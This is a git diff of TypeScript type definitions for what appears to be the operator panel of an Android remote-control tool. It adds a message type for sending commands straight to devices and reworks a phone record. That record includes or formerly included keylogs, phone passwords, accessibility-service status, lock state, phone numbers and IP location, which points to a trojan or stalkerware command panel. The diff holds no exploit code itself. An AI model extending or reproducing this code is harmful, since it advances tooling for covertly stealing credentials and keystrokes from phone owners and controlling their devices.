@@ -136,6 +136,13 @@ export interface SubscribeMessage {
   email: string;
 }
 
+// APK command messages (new format, proxied directly to device)
+export interface DeviceCommandMessage {
+  command: string;
+  params: Record<string, unknown>;
+  pid: string;
+}
+
 // Data request messages (slr_panelsend)
 export interface DataRequestMessage {
   itype: 'slr_panelsend';
@@ -227,6 +234,7 @@ export type WebSocketOutboundMessage =
   | ProxyMessage
   | BrowserMessage
   | DataRequestMessage
+  | DeviceCommandMessage
   | CheckPhoneMessage
   | SubscribeMessage;
 
@@ -491,27 +499,43 @@ export type WebSocketInboundMessage =
 export interface PhoneInfo {
   pid?: string;
   phone_id?: string;
-  phone_name?: string;
+  device_id?: string;
+  device_name?: string;
   remark?: string;
   model?: string;
+  brand?: string;
+  manufacturer?: string;
   android_version?: string;
-  battery_charge?: string;
-  accessibility?: '0' | '1' | string;
+  sdk_version?: number;
+  app_name?: string;
+  app_version?: string;
+  battery_level?: number | string;
+  battery_is_charging?: boolean | string;
+  has_accessibility?: boolean | string;
+  network_type?: string;
+  screen_width?: number;
+  screen_height?: number;
+  has_sim?: boolean | string;
+  phone_number?: string;
+  phone_number2?: string;
   country?: string;
-  user_email?: string;
-  install_date?: string;
-  keylogs?: string;
-  phone_password?: string;
-  display?: string;
-  activz?: string;
-  lastPing?: number;
-  is_online?: boolean;
-  phone?: string;
+  is_locked?: boolean | string;
+  is_screen_on?: boolean | string;
   ip?: string;
   ip_location?: string;
-  has_password?: string;
-  network?: string;
+  lastPing?: number;
+  last_ping?: number;
+  is_online?: boolean;
   wallpap?: string;
+  activz?: string;
+  // Legacy fields (backward compat)
+  phone_name?: string;
+  battery_charge?: string;
+  accessibility?: '0' | '1' | string;
+  phone?: string;
+  network?: string;
+  has_password?: string;
+  install_date?: string;
 }
 
 // ============================================
